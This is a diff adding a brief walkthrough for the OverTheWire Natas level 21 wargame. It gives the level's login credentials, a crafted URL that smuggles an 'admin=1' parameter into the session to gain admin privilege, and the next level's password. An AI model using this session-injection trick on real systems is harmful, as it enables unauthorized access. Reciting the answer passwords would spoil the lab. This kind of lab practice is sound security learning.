@@ -1,0 +1,12 @@
+URL: http://natas21.natas.labs.overthewire.org
+username: natas21
+password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+Go to the experimentor page.
+It dumps all post values to sessions.
+So in the url add 
+http://natas21-experimenter.natas.labs.overthewire.org/index.php?align=center&fontsize100%25&bgcolor=red&submit=true&admin=1
+add an addition admin =1 which will become a session and produce a session cookie.
+Use this cookie in the main page to get the admin privilege.
+
+chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
